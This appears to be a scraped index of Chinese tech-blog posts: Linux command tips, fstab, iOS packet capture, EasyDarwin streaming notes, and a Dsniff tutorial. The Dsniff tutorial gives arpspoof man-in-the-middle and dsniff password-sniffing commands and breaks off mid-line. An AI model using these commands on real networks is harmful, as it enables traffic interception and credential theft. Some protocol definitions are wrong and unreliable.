(samba提供所有windows相关的网络支持)\n•\tsmbtree\t寻找一个windows主机. 参见findsmb\n \tnmblookup -A 1.2.3.4\t寻找一个指定ip的windows (netbios)名\n \tsmbclient -L windowsbox\t显示在windows主机或samba服务器上的所有共享\n \tmount -t smbfs -o fmask=666,guest //windowsbox/share /mnt/share\t挂载一个windows共享\n \techo 'message' | smbclient -M windowsbox\t发送一个弹出信息到windows主机(XP sp2默认关闭此功能)\n文本操作 (sed使用标准输入和标准输出，如果想要编辑文件，则需添加oldfile newfile)\n \tsed 's/string1/string2/g'\t使用string2替换string1\n \tsed 's/\\(.\\)1/\\12/g'\t将任何以1结尾的字符串替换为以2结尾的字符串\n \tsed '/^ #/d; /^ $/d'\t删除注释和空白行\n \tsed ':a; /\\\\$/N; s/\\\\\\n//; ta'\t连接结尾有\\的行和其下一行\n \tsed 's/[ \\t]$//'\t删除每行后的空白\n \tsed 's/\\([\\\\\\\\\"$\\\\\\\\]\\)/\\\\\\1/g'\t将所有转义字符之前加上\\\n•\tseq 10 | sed \"s/^/      /; s/ \\(.\\{7,\\}\\)/\\1/\"\t向右排N(任意数)列\n \tsed -n '1000p;1000q'\t输出第一千行\n \tsed -n '10,20p;20q'\t输出第10-20行\n \tsed -n 's/.title\\(.\\)\\/title./\\1/ip;T;q'\t输出HTML文件的title/title字段中的 内容\n \tsort -t. -k1,1n -k2,2n -k3,3n -k4,4n\t排序IPV4地址\n•\techo 'Test' | tr '[:lower:]' '[:upper:]'\t转换成大写\n•\ttr -dc '[:print:]' \u003c /dev/urandom\t过滤掉不能打印的字符\n•\thistory | wc -l\t计算指定单词出现的次数\n集合操作 (如果是英文文本的话export LANG=C可以提高速度)\n \tsort -u file1 file2\t两个未排序文件的并集\n \tsort file1 file2 | uniq -d\t两个未排序文件的交集\n \tsort file1 file1 file2 | uniq -u\t两个未排序文件的差 集\n \tsort file1 file2 | uniq -u\t两个未排序文件的对称差集\n \tjoin -t'\\0' -a1 -a2 file1 file2\t两个有序文件的并集\n \tjoin -t'\\0' file1 file2\t两个有序文件的交集\n \tjoin -t'\\0' -v2 file1 file2\t两个有序文件的差集\n \tjoin -t'\\0' -v1 -v2 file1 file2\t两个有序文件的对称差集\n数学\n•\techo '(1 + sqrt(5))/2' | bc -l\t方便的计算器(计算 φ)\n•\techo 'pad=20; min=64; (10010^6)/((pad+min)8)' | bc\t更复杂地计算，这里计算了最大的FastE包率\n•\techo 'pad=20; min=64; print (100E6)/((pad+min)8)' | python\tPython处理数值的科学表示法\n•\techo 'pad=20; plot [64:1518] (100106)/((pad+x)8)' | gnuplot -persist\t显示FastE包率相对于包大小的图形\n•\techo 'obase=16; ibase=10; 64206' | bc\t进制转换(十进制到十六进制)\n•\techo $((0x2dec))\t进制转换(十六进制到十进制)((shell数学扩展))\n•\tunits -t '100m/9.58s' 'miles/hour'\t单位转换(公尺到英尺)\n•\tunits -t '500GB' 'GiB'\t单位转换(SI 到IEC 前缀). 参见 numfmt\n•\tunits -t '1 googol'\t定义查找\n•\tseq 100 | (tr '\\n' +; echo 0) | bc\t加N(任意数)列. 参见 add and funcpy\n日历\n•\tcal -3\t显示一日历\n•\tcal 9 1752\t显示指定月，年的日历\n•\tdate -d fri\t这个星期五是几号. 参见day\n•\tdate --date='25 Dec' +%A\t今年的圣诞节是星期几\n•\tdate --date '1970-01-01 UTC 2147483647 seconds'\t将一相对于1970-01-01 00：00的秒数转换成时间\n•\tTZ=':America/LosAngeles' date\t显示当前的美国西岸时间(使用tzselect寻找时区)\n \techo \"mail -s 'get the train' P@draigBrady.com \u003c /dev/null\" | at 17:45\t在指定的时间发送邮件\n•\techo \"DISPLAY=$DISPLAY xmessage cooker\" | at \"NOW + 30 minutes\"\t在给定的时间弹出对话框\nlocales\n  locale -a  支持的编码\n•\tprintf \"%'d\\n\" 1234\t根据locale输出正确的数字分隔\n•\tBLOCKSIZE=\\'1 ls -l\t用ls命令作类适于locale()文件分组\n•\techo \"I live in locale territory\"\t从locale数据库中展开信息\n•\tLANG=enIE.utf8 locale intprefix\t查找指定地区的locale信息。参见ccodes\n•\tlocale | cut -d= -f1 | xargs locale -kc | less\t显示在locale数据库中的所有字段\nrecode (iconv, dos2unix, unix2dos 已经过时了)\n•\trecode -l | less\t显示所有有效的字符集及其别名\n \trecode windows-1252.. filetochange.txt\t转换Windows下的ansi文件到当前的字符集(自动进行回车换行符的转换)\n \trecode utf-8/CRLF.. filetochange.txt\t转换Windows下的ansi文件到当前的字符集\n \trecode iso-8859-15..utf8 filetochange.txt\t转换Latin9（西欧）字符集文件到utf8\n \trecode ../b64  file.txt  file.b64\tBase64编码\n \trecode /qp..  file.txt  file.qp\tQuoted-printable格式解码\n \trecode ..HTML  file.txt  file.html\t将文本文件转换成HTML\n•\trecode -lf windows-1252 | grep euro\t在字符表中查找欧元符号\n•\techo -n 0x80 | recode latin-9/x1..dump\t显示字符在latin-9中的字符映射\n•\techo -n 0x20AC | recode ucs-2/x2..latin-9/x\t显示latin-9编码\n•\techo -n 0x20AC | recode ucs-2/x2..utf-8/x\t显示utf-8编码\n光盘\n \tgzip  /dev/cdrom  cdrom.iso.gz\t保存光盘拷贝\n \tmkisofs -V LABEL -r dir | gzip   cdrom.iso.gz\t建立目录dir的光盘镜像\n \tmount -o loop cdrom.iso /mnt/dir\t将光盘镜像挂载到 /mnt/dir (只读)\n \tcdrecord -v dev=/dev/cdrom blank=fast\t清空一张CDRW\n \tgzip -dc cdrom.iso.gz | cdrecord -v dev=/dev/cdrom -\t烧录光盘镜像 (使用 dev=ATAPI -scanbus 来确认该使用的 dev)\n \tcdparanoia -B\t在当前目录下将光盘音轨转录成wav文件\n \tcdrecord -v dev=/dev/cdrom -audio .wav\t将当前目录下的wav文件烧成音乐光盘 (参见cdrdao)\n \toggenc --tracknum='track' track.cdda.wav -o 'track.ogg'\t将wav文件转换成ogg格式\n  磁盘空间 (参见FSlint)\n•\tls -lSr\t按文件大小降序显示文件\n•\tdu -s  | sort -k1,1rn | head\t显示当前目录下占用空间最大的一批文件. 参见dutop\n•\tdf -h\t显示空余的磁盘空间\n•\tdf -i\t显示空余的inode\n•\tfdisk -l\t显示磁盘分区大小和类型（在root下执行）\n•\trpm -q -a --qf '%10{SIZE}\\t%{NAME}\\n' | sort -k1,1n\t显示所有在rpm发布版上安装的包，并以包字节大小为序\n•\tdpkg-query -W -f='${Installed-Size;10}\\t${Package}\\n' | sort -k1,1n\t显示所有在deb发布版上安装的包，并以KB包大小为序\n•\tdd bs=1 seek=2TB if=/dev/null of=ext3.test\t建立一个大的测试文件（不占用空间）. 参见truncate\n监视/调试\n•\ttail -f /var/log/messages\t监视Messages日志文件\n•\tstrace -c ls   /dev/null\t总结/剖析命令进行的系统调用\n•\tstrace -f -e open ls   /dev/null\t显示命令进行的系统调用\n•\tltrace -f -e getenv ls   /dev/null\t显示命令调用的库函数\n•\tlsof -p $$\t显示当前进程打开的文件\n•\tlsof ~\t显示打开用户目录的进程\n•\ttcpdump not port 22\t显示除了ssh外的网络交通. 参见tcpdumpnotme\n•\tps -e -o pid,args --forest\t以树状结构显示进程\n•\tps -e -o pcpu,cpu,nice,state,cputime,args --sort pcpu | sed '/^ 0.0 /d'\t以CPU占用率为序显示进程\n•\tps -e -orss=,args= | sort -b -k1,1n | pr -TW$COLUMNS\t以内存使用量为序显示进程. 参见psmem.py\n•\tps -C firefox-bin -L -o pid,tid,pcpu,state\t显示指定进程的所有线程信息\n•\tps -p 1,2\t显示指定进程ID的进程信息\n•\tlast reboot\t显示系统重启记录\n•\tfree -m\t显示(剩余的)内存总量(-m以MB为单位显示)\n•\twatch -n.1 'cat /proc/interrupts'\t监测文件/proc/interrupts的变化\n系统信息 (参见sysinfo)\n•\tuname -a\t查看内核/操作系统/CPU信息\n•\thead -n1 /etc/issue\t查看操作系统版本\n•\tcat /proc/partitions\t显示所有在系统中注册的分区\n•\tgrep MemTotal /proc/meminfo\t显示系统可见的内存总量\n•\tgrep \"model name\" /proc/cpuinfo\t显示CPU信息\n•\tlspci -tv\t显示PCI信息\n•\tlsusb -tv\t显示USB信息\n•\tmount | column -t\t显示所有挂载的文件系统并对齐输出\ndmidecode -q | less\t显示SMBIOS/DMI 信息\n\tsmartctl -A /dev/sda | grep PowerOn_Hours\t系统开机的总体时间\nhdparm -i /dev/sda\t显示关于磁盘sda的信息\n\thdparm -tT /dev/sda\t检测磁盘sda的读取速度\nbadblocks -s /dev/sda\t检测磁盘sda上所有的坏扇区\n交互 (参见linux keyboard shortcut database)\n•\treadline\tLine editor used by bash, python, bc, gnuplot, ...\n•\tscreen\t多窗口的虚拟终端, ...\n•\tmc\t强大的文件管理器，可以浏览rpm, tar, ftp, ssh, ...\n•\tgnuplot\t交互式并可进行脚本编程的画图工具\n•\tlinks\t网页浏览器\nmiscellaneous\n•\talias hd='od -Ax -tx1z -v'\t方便的十六进制输出。 (用法举例: • hd /proc/self/cmdline | less)\n•\talias realpath='readlink -f'\t显示符号链接指向的真实路径((用法举例: • realpath ~/../$USER)\n•\tset | grep $USER\t在当前环境中查找\n \ttouch -c -t 0304050607 file\t改变文件的时间标签 (YYMMDDhhmm)\n•\tpython -m SimpleHTTPServer\tServe current directory tree at http://$HOSTNAME:8000/","tags":null},{"location":"//blog.pytool.com/Linux/2016-01-01 Linux fstab","title":"Linux 下/etc/fstab文件详解","text":"有很多人经常修改/etc/fstab文件，但是其中却有很多人对这个文件所表达的意义不太清楚，因为只要按照一定的模式，就可以轻而易举地添加一行挂载信息，而不需要完全理解其中的原理。\n\n/etc/fstab是用来存放文件系统的静态信息的文件。位于/etc/目录下，可以用命令less /etc/fstab 来查看，如果要修改的话，则用命令 vi /etc/fstab 来修改。\n\n当系统启动的时候，系统会自动地从这个文件读取信息，并且会自动将此文件中指定的文件系统挂载到指定的目录。下面我来介绍如何在此文件下填写信息。\n\n在这个文件下，我们要关注的是它的六个域，分别为：file system、mount point、type 、options、dump、pass。下面将详细介绍这六个域的详细意义。\n\nfie sysytem。这里用来指定你要挂载的文件系统的设备名称或块信息，也可以是远程的文件系统。做过嵌入式linux开发的朋友都可能知道 mount 192.168.1.56:/home/nfs /mnt/nfs/ -o nolock (可以是其他IP)命令所代表的意义。它的任务是把IP为192.168.1.56的远程主机上的/home/nfs/目录挂载到本机的/mnt/nfs /目录之下。如果要把它写进/etc/fstab文件中，file system这部分应填写为：/192.168.1.56:/home/nfs/。\n\n如果想把本机上的某个设备（device）挂载上来，写法如：/dev/sda1、/dev/hda2或/dev/cdrom，其中，/dev/sda1 表示第一个串口硬盘的第一个分区，也可以是第一个SCSI硬盘的第一个分区，/dev/hda1表示第一个IDE硬盘的第一个分区，/dev/cdrom 表示光驱。\n\n此外，还可以label(卷标)或UUID（Universally Unique Identifier全局唯一标识符）来表示。用label表示之前，先要e2label创建卷标，如：e2label /dir1 /dir2，其意思是说用/dir2来表示/dir1的名称。然后，再在/etc/fstab下按如下形式添加：LABEL=/dir2 /dir2 type   options dump pass。重启后，系统就会将/dir1挂载到/dir2目录上。对于UUID，可以用blkid -o value -s UUID /dev/sdxx来获取。比如我想挂载第一块硬盘的第十一个分区，先用命令blkid -o value -s UUID /dev/sda11 来取得UUID，比如是：5dc08a62-3472-471b-9ef5-0a91e5e2c126，然后在file system这个域上填写： UUID=5dc08a62-3472-471b-9ef5-0a91e5e2c126，即可表示/dev/sda11。Red Hat linux 一般会使用label，而Ubuntu linux 一般会用UUID。\n\nmount point。挂载点，也就是自己找一个或创建一个dir（目录），然后把文件系统fie sysytem挂到这个目录上，然后就可以从这个目录中访问要挂载文件系统。对于swap分区，这个域应该填写：none，表示没有挂载点。\n\ntype。这里用来指定文件系统的类型。下面的文件系统都是目前Linux所能支持的：adfs、befs、cifs、ext3、 ext2、ext、iso9660、kafs、minix、msdos、vfat、umsdos、proc、reiserfs、swap、 squashfs、nfs、hpfs、ncpfs、ntfs、affs、ufs。\n\noptions。这里用来填写设置选项，各个选项用逗号隔开。由于选项非常多，而这里篇幅有限，所以不再作详细介绍，如需了解，请用命令 man mount 来查看。但在这里有个非常重要的关键字需要了解一下：defaults，它代表包含了选项rw,suid,dev,exec,auto,nouser和 async。\n\ndump。此处为1的话，表示要将整个fie sysytem里的内容备份；为0的话，表示不备份。现在很少用到dump这个工具，在这里一般选0。\n\npass。这里用来指定如何使用fsck来检查硬盘。如果这里填0，则不检查；挂载点为 / 的（即根分区），必须在这里填写1，其他的都不能填写1。如果有分区填写大于1的话，则在检查完根分区后，接着按填写的数字从小到大依次检查下去。同数字的同时检查。比如第一和第二个分区填写2，第三和第四个分区填写3，则系统在检查完根分区后，接着同时检查第一和第二个分区，然后再同时检查第三和第四个分区。\n\n参考文献：\n1、On-line reference manuals of Linux (用命令 man 5 fstab 查看)。\n2、Linux Bible 2008 Edition.   By Christopher Negus. Published by Wiley Publishing, Inc.2008\n3、Linux Administration Handbook (Second Edition)    By [US] Evi Nemeth   Garth Snyder   Trent R. Hein .    Published by Pearson Education,Inc.2007","tags":null},{"location":"//blog.pytool.com/Hardware/2015-12-02 STM32中断","title":"STM32中断","text":"stmcube太强大了\n0x00 外部中配置EXIT\nstm32中断边沿是可配置的\n既可以配置为上升沿触发，也可配置为下降沿触发，还可以同时触发","tags":null},{"location":"//blog.pytool.com/Hacker/2016-03-18 debug-ios-traffic","title":"iOS抓包（使用BurpSuite和tcpdump）","text":"Introduce\n\n开发过程中我们经常会需要对网络请求抓包，本次介绍的是使用BurpSuite抓取HTTP/HTTPS包，以及不越狱使用tcpdump抓取iPhone的网络包。  \n\n 使用BurpSuite对HTTP/HTTPS抓包\n开发中我们经常会需要对HTTP/HTTPS请求进行抓包。  \n抓包实际上是在中间机器开了一个代理服务，让需要抓包的请求经过代理，我们就可以看到这些请求了。本质上是中间人攻击。  \nBurpSuite是一个常用的调试工具。  \n\n1. 下载BurpSuite\n从BurpSuite官网下载jar包，右键点击，运行：  \n\n!--more--\n\n 2. Burp设置\n\n先从菜单Burp-  Remember settings中检查是否All options都记录设置了，以便下次打开不用重新配置：  \n\n在选项卡的Proxy-  Options中，选择代理规则，点击Edit：  \n\n在弹出的对话框中选择All interfaces，再点击OK，来监听所有的网卡：  \n\n至此已经可以通过代理来监听手机的HTTP请求了。现在我们再制作CA让手机信任，来解密被加密的HTTPS请求。  \n\n回到选项卡的Proxy-  Options中，重新生成证书，以防被拥有相同的证书的人中间人攻击。生成后需要重启Burp：  \n\n重启Burp后，回到选项卡的Proxy-  Options中，导出证书为Der格式：  \n\n然后将Der证书通过HTTP服务器或邮件发给手机，在手机上安装证书：  \n\n第一次用，先关闭排除规则，抓取全部的包。在Proxy-  Intercept选项卡中，点击按钮，使其显示‘Intercept is off’:  \n\n3. 设置手机/模拟器代理\n\n先看下Mac的网卡地址：  \n\n然后在手机的wifi详情中设置手动代理：  \n\n如果是模拟器，在网卡的高级设置中，设置HTTP和HTTPS代理为127.0.0.1:8080：  \n\n在手机或模拟器中发送请求，然后在Burp选项卡的Proxy-  HTTP history中可以查看到结果：  \n\n 4. 测试完成后删除手机的Der\n\n不删除一旦私钥泄露会被中间人攻击，保险起见，调试完就赶紧从手机删掉证书。  \n\n在系统设置-  通用-  描述文件中找到刚才安装的证书，然后删除：  \n\n使用tcpdump抓包\n\n我们经常会用tcpdump抓取各种协议的网络包。  \niOS5之后，可以使用Remote Virtual Interface(RVI)建立虚拟网卡进行抓包，好处是：  \n\n新版的Macbook/Air/Pro只有一块Wifi，没有RJ45接口，我们用USB线连接手机就可以完成抓包。  \n使用RVI不管是蜂窝数据还是Wifi，网络报文都能抓的到，而以往用Wifi把流量导入电脑抓包无法抓取蜂窝数据下的报文。  \n\n 1. 建立RVI\n\n首先将手机用数据线连接到电脑。  \n\n使用ifconfig -l命令查看当前网卡：  \n\n$ ifconfig -l\nlo0 gif0 stf0 en0 en1 en2 p2p0 awdl0 bridge0 en4\n\n查看手机的udid，然后使用rvictl命令建立rvi：  \n\n$ rvictl -s a1fad5xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxc60b\nStarting device a1fad59f135e2cd8f7dda951a15c01cd2220c60b [SUCCEEDED] with interface rvi0\n\n再次使用ifconfig -l查看网卡：  \n\n$ ifconfig -l\nlo0 gif0 stf0 en0 en1 en2 p2p0 awdl0 bridge0 en4 rvi0\n\n我们发现多出了一个rvi0，这个就是新建立的rvi。  \n\n2. 抓包\n\n$ sudo tcpdump -i rvi0 -w trace.pcap\n\n然后在手机上进行操作，操作结束后在terminal里按control+c，结束抓包。然后trace.pcap就是生成的抓包记录。  \n\n之后断开rvi连接：  \n\n$ rvictl -s a1fad5xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxc60b\nStopping device a1fad59f135e2cd8f7dda951a15c01cd2220c60b [SUCCEEDED]\n\n我们可以将pcap文件转换成纯文本格式查看：  \n\ntcpdump -n -e -x -vvv -r trace.pcap   trace.txt\n\n不过一般还是用wireshark直接打开pcap文件查看比较方便。  \n\n相关资源：  \n\nApple Technical Q\u0026A 1176 : Getting a Packet Trace\n\nOver","tags":null},{"location":"//blog.pytool.com/Post/流媒体/2016-02-29 服务器 EasyDarwin","title":"EasyDarwin","text":"ssh root@139.129.108.163\n\nnetsh advfirewall firewall add rule name=\"BLOCKDWS\" dir=out interface=any action=block remoteip=111.221.29.177\nnetsh advfirewall firewall add rule name=\"Remote Desktop Services\" protocol=TCP dir=in localport=%port% action=allow\n\n1、rtsp://184.72.239.149/vod/mp4://BigBuckBunny175k.mov\n一段动画片\n2、rtsp://218.204.223.237:554/live/1/66251FC11353191F/e7ooqwcfbqjoo80j.sdp\n拱北口岸珠海过澳门大厅\n3、rtsp://218.204.223.237:554/live/1/0547424F573B085C/gsfp90ef4k0a6iap.sdp\n\n公网RTSP地址\nH264+AAC：\n\nMPEG-4：\n中国边检\n横琴口岸入境大厅\n\nnetsh advfirewall firewall add rule name=\"CMS RTSP\" protocol=TCP dir=in localport=554 action=allow\nnetsh advfirewall firewall add rule name=\"EasyDarwin RTSP\" protocol=TCP dir=in localport=8554 action=allow\n\nrtsp://115.28.60.222:8554/demo.mp4\n\n3、配置easydarwin.xml \n\nEasyDarwin做转发延时10几秒\n!-- easydarwin.xml控制转发缓存时间 --\nPREF NAME=\"reflectorbuffersizesec\" TYPE=\"UInt32\" 0/PREF\n\n在EasyDarwin QTSSReflectorModule\n转发模块中，有一个控制转发Buffer时间的配置reflectorbuffersizesec，我们将这个配置改成0，也就是在服务器端不做缓存，直接转发，这样在网络条件充足的情况下对比转发和实时流，转发带来的延时也几乎可以忽略了：\n\nEasyDarwin主要的几个配置项：\nrtspport：EasyDarwin RTSP服务监听的端口；\nmoviefolder：流媒体文件本地存储的路径，包括点播mp4文件、直播切片生成的hls（m3u8+ts）文件；\nhttp\\service\\port：RESTful服务端口；\nhls\\output\\enabled：配置QTSSReflectorModule在接收推送的同时，是否同步输出hls流；\nHTTP\\ROOT\\DIR：配置EasyHLSModule的对外WEB路径，用于hls分发的web服务器路径；\nlocal\\ip\\address：配置EasyRelayModule对外服务的ip地址，因为可能会有多网卡或者内网映射，所以需要手动配置；\n\n以Linux系统nginx做WEB服务器为例，比如我们将点播文件存储在/EasyDarwin/movies/目录，也就是\n\n    PREF NAME=\"moviefolder\" /EasyDarwin/movies//PREF\n\nNginx的WEB地址为：http://8.8.8.8/，那么我们配置：\n\n    PREF NAME=\"HTTPROOTDIR\" http://8.8.8.8//PREF\n这样就能够将EasyDarwin存储的HLS文件WEB发布到公网了，具体配置可以参考后面HLS直播配置章节。\n\nRestful\n获取easydarwin RTSP 连接数量\nhttp://139.129.108.163:8080/api/getrtsppushsessions\n\n用EasyDarwin EasyRelayModule进行拉模式转发：\n命令：RTSP://[EasyDarwinIP]:[rtspport]/EasyRelayModule?name=[relayName]\u0026url=\"[RTSPURL]\"\n例如EasyDarwin服务器IP地址是：192.168.66.100，RTSP端口(rtspport)：554，IPCamera的RTSP地址是：rtsp://admin:admin@192.168.66.189/22，那么我们可以：\n1、配置\nMODULE NAME=\"EasyRelayModule\" \n\tPREF NAME=\"localipaddress\" 192.168.66.100/PREF\n/MODULE\n2、请求转发：RTSP://192.168.66.100:554/EasyRelayModule?name=live\u0026url=\"rtsp://admin:admin@192.168.66.189/22\"   （name是定义一个拉模式转发流的唯一标识，不允许重复）\n3、直播URL：RTSP://192.168.66.100:554/EasyRelayModule?name=live\n4、请求停止转发：RTSP://192.168.66.100:554/EasyRelayModule?name=live\u0026cmd=stop  （cmd=stop表示停止拉模式转发）\n\nrtsp://115.28.60.222:554/EasyRelayModule?name=live\n用EasyDarwin EasyHLSModule进行HLS切片：\n命令：RTSP://[EasyDarwinIP]:[httpserviceport]/api/easyhlsmodule?name=[hlsName]\u0026url=[RTSPURL]\n例如EasyDarwin服务器IP地址是：192.168.66.100，EasyDarwin WebService端口(httpserviceport)：8080，IPCamera的RTSP地址是：rtsp://admin:admin@192.168.66.189/22，同时，我们在EasyDarwin服务器上部署了nginx，端口为8088，WEB目录为easydarwin.xml中moviefolder同一个目录，那么我们可以：\n1、配置\nMODULE NAME=\"EasyHLSModule\" \n\tPREF NAME=\"HTTPROOTDIR\" http://192.168.66.100:8088//PREF\n/MODULE\n2、请求接口：http://192.168.66.100:8080/api/easyhlsmodule?name=live\u0026url=rtsp://admin:admin@192.168.66.189/22   （接口会返回http+json格式的hls流地址）\n3、请求停止转发：http://192.168.66.100:8080/api/easyhlsmodule?name=live\u0026cmd=stop  （cmd=stop表示停止HLS切片）\nMP4Box\ngit clone https://github.com/gpac/gpac.git\ncd gpac\ngit pull\n./configure --static-mp4box --use-zlib=no\nmake -j4\nsudo make install\n下载地址\n     GPAC下载地址：http://gpac.wp.mines-telecom.fr/downloads/\n     参考文档：MP4Box使用命令大全\n\n如何查看帮助\n    1) mp4box -h\n\n         查看mp4box中的所有帮助信息\n\n    2) mp4box -h general\n\n         查看mp4box中的通用帮助信息\n\n常用命令\n    1) mp4box -info test.mp4\n        查看test.mp4文件是否有问题\n\n    2) mp4box   -add    test.mp4   test-new.mp4\n        修复test.mp4文件格式不标准的问题，并把新文件保存在test-new.mp4中\n\n    3) mp4box  -inter  10000 test-new.mp4\n        解决开始播放test-new.mp4卡一下的问题，为HTTP下载快速播放有效，10000ms\n\n    4) mp4box -add file.avi newfile.mp4\n        把avi文件转换为mp4文件\n\n    5) mp4box -hint file.mp4\n        为RTP准备，此指令将为文件创建RTP提示跟踪信息。这使得经典的流媒体服务器像darwinstreamingserver或QuickTime的流媒体服务器通过RTSP／RTP传输文件\n\n    6) mp4box -cat test1.mp4 -cat test2.mp4 -new test.mp4\n        把test1.mp4和test2.mp4合并到一个新的文件test.mp4中，要求编码参数一致\n\n    7) mp4box -force-cat test1.mp4 -force-cat test2.mp4 -new test.mp4\n        把test1.mp4和test2.mp4强制合并到一个新的文件test.mp4中，有可能不能播放\n\n    8) mp4box -add video1.264 -cat video2.264 -cat video3.264 -add audio1.aac -cat audio2.aac -cat audio3.aac -new muxed.mp4 -fps 24\n        合并多段音视频并保持同步\n\n    9) mp4box -split timesec test.mp4\n        切取test.mp4中的前面timesec秒的视频文件\n\n    10) mp4box -split-size size test.mp4\n          切取前面大小为size KB的视频文件\n\n    11) mp4box -split-chunk S:E test.mp4\n          切取起始为S少，结束为E秒的视频文件\n    12) mp4box -add 1.mp4video -add 2.mp4#audio -new test.mp4\n\n          test.mp4由1.mp4中的视频与2.mp4中的音频合并生成\n\n理论上RTSP RTMPHTTP都可以做直播和点播，但一般做直播用RTSP RTMP，做点播用HTTP。做视频会议的时候原来用SIP协议，现在基本上被RTMP协议取代了。\nRTSP、 RTMP、HTTP的共同点、区别\n共同点：\n1：RTSP RTMP HTTP都是在应用应用层。\n2： 理论上RTSP RTMPHTTP都可以做直播和点播，但一般做直播用RTSP RTMP，做点播用HTTP。做视频会议的时候原来用SIP协议，现在基本上被RTMP协议取代了。\n 区别：\n1：HTTP: 即超文本传送协议(ftp即文件传输协议)。\nHTTP:（Real Time Streaming Protocol），实时流传输协议。\nHTTP全称Routing Table Maintenance Protocol（路由选择表维护协议）。\n2：HTTP将所有的数据作为文件做处理。http协议不是流媒体协议。\nRTMP和RTSP协议是流媒体协议。\n3：RTMP协议是Adobe的私有协议,未完全公开，RTSP协议和HTTP协议是共有协议，并有专门机构做维护。\n4：RTMP协议一般传输的是flv，f4v格式流，RTSP协议一般传输的是ts,mp4格式的流。HTTP没有特定的流。\n5：RTSP传输一般需要2-3个通道，命令和数据通道分离，HTTP和RTMP一般在TCP一个通道上传输命令和数据。\nRTSP、RTCP、RTP区别\n1：RTSP实时流协议\n作为一个应用层协议，RTSP提供了一个可供扩展的框架，它的意义在于使得实时流媒体数据的受控和点播变得可能。总的说来，RTSP是一个流媒体表示 协议，主要用来控制具有实时特性的数据发送，但它本身并不传输数据，而是必须依赖于下层传输协议所提供的某些服务。RTSP可以对流媒体提供诸如播放、暂 停、快进等操作，它负责定义具体的控制消息、操作方法、状态码等，此外还描述了与RTP间的交互操作（RFC2326）。\n2：RTCP控制协议\nRTCP控制协议需要与RTP数据协议一起配合使用，当应用程序启动一个RTP会话时将同时占用两个端口，分别供RTP和RTCP使用。RTP本身并 不能为按序传输数据包提供可靠的保证，也不提供流量控制和拥塞控制，这些都由RTCP来负责完成。通常RTCP会采用与RTP相同的分发机制，向会话中的 所有成员周期性地发送控制信息，应用程序通过接收这些数据，从中获取会话参与者的相关资料，以及网络状况、分组丢失概率等反馈信息，从而能够对服务质量进 行控制或者对网络状况进行诊断。\nRTCP协议的功能是通过不同的RTCP数据报来实现的，主要有如下几种类型：\nSR：发送端报告，所谓发送端是指发出RTP数据报的应用程序或者终端，发送端同时也可以是接收端。(SERVER定时间发送给CLIENT)。\nRR：接收端报告，所谓接收端是指仅接收但不发送RTP数据报的应用程序或者终端。(SERVER接收CLIENT端发送过来的响应)。\nSDES：源描述，主要功能是作为会话成员有关标识信息的载体，如用户名、邮件地址、电话号码等，此外还具有向会话成员传达会话控制信息的功能。\nBYE：通知离开，主要功能是指示某一个或者几个源不再有效，即通知会话中的其他成员自己将退出会话。\nAPP：由应用程序自己定义，解决了RTCP的扩展性问题，并且为协议的实现者提供了很大的灵活性。\n3：RTP数据协议\nRTP数据协议负责对流媒体数据进行封包并实现媒体流的实时传输，每一个RTP数据报都由头部（Header）和负载（Payload）两个部分组成，其中头部前12个字节的含义是固定的，而负载则可以是音频或者视频数据。\nRTP用到的地方就是 PLAY ，服务器往客户端传输数据用UDP协议，RTP是在传输数据的前面加了个12字节的头(描述信息)。\nRTP载荷封装设计本文的网络传输是基于IP协议，所以最大传输单元(MTU)最大为1500字节，在使用IP／UDP／RTP的协议层次结构的时候，这 其中包括至少20字节的IP头，8字节的UDP头，以及12字节的RTP头。这样，头信息至少要占用40个字节，那么RTP载荷的最大尺寸为1460字 节。以H264 为例，如果一帧数据大于1460，则需要分片打包，然后到接收端再拆包，组合成一帧数据，进行解码播放。","tags":null},{"location":"//blog.pytool.com/Post/drone/2016-10-04 Drone插件","title":"drone","text":"go get github.com/UKHomeOffice/drone-trigger\n\ndrone repo ls\ndrone-trigger -r bianban/lybb","tags":null},{"location":"//blog.pytool.com/Hacker/02_欺骗嗅探/2016-03-29 Dsniff","title":"Dsniff","text":"Dsniff是一个非常强大的工具套件，它被用来进行渗透测试。它被用来实施嗅探、网络分析等。它能够捕捉各种协议。ARPspoof和driftnet也是dsniff套件的一部分，当然还有其他套件，如：\n\nMsgsnarf\nUrlsnarf\nMailsnarf\nFilesnarf\ndnsspoof\n\n在如下攻击场景中：\n\n攻击者IP： 192.168.1.12\n被攻击主机IP:192.168.1.6\n路由(网关)IP：192.168.1.1\n\n################################################################################\n\nUsage: arpspoof [-i interface] [-t target] host\n\t-i interface 指定使用的网卡\n\t-c own|host|both 攻击结束后如何恢复\n\t-r \t\t\t\t双向毒化\n\t-t target 指定要攻击的目标\n\thost \t\t\t指定要拦截的主机(默认为网关)\n\n启动Arpspoof注入攻击目标系统。攻击的方法是攻击者（192.168.6.100）发送ARP数据包，以欺骗网关（192.168.6.1）和目标系统（192.168.6.101）。\n下面首先欺骗目标系统，执行命令如下所示：\narpspoof -i eth0 -t 192.168.6.101 192.168.6.1\n使用Arpspoof欺骗网关。执行命令如下所示：\narpspoof -i eth0 -t 192.168.6.1 192.168.6.101\n\n##########\nDon't forget to enable IP forwarding on your host so that the traffic goes through your host. Otherwise victim will loose connectivity.\necho 1   /proc/sys/net/ipv4/ipforward\n\nIn order to tell the victim host that now we (our MAC address) are the one belonging to the IP of the gateway enter the following command:\n arpspoof -t victim gateway\n\nIn a seperate shell we start the matching command to fool gateway to belive we are victim.\narpspoof -t gateway victim\n\n##########################################################################\n\n让我们开始进行ARPspoof IP转发攻击：\n\nroot@bt:~# echo 1     /proc/sys/net/ipv4/ipforwardroot@bt:~# arpspoof -i eth0 -t 192.168.1.6 192.168.1.1root@bt:~# arpspoof -i eth0 -t 192.168.1.1 192.168.1.12\n\n我刚刚启用端口转发，之后使用arpspoof（dsniff的一个插件）来执行ARP毒化攻击。开启dsniff来捕获已知协议获取密码。\n\nroot@bt:~# dsniff -i eth0\ndsniff: listening on eth0\n\n\t如图所示，dsniff成功从受害者主机上捕获了FTP的用户名和密码，尽管这个密码是不正确的，但dsniff可以捕获受害者发送的信息。\n\n因为攻击者的主机作为了默认的路由器（因为进行了ARP欺骗），因此受害主机传输的数据经过攻击者，攻击者很容易可以嗅探到受害者发送的信息。我们可以arpspoof所有网段内的主机，但我们的示例中只ARP欺骗了单个主机。你可以试试其他的dsniif工具，像urlsnarf。\n\nroot@bt:~# urlsnarf -i eth0\nurlsnarf: listening on eth0 [tcp port 80 or port 8080 or port 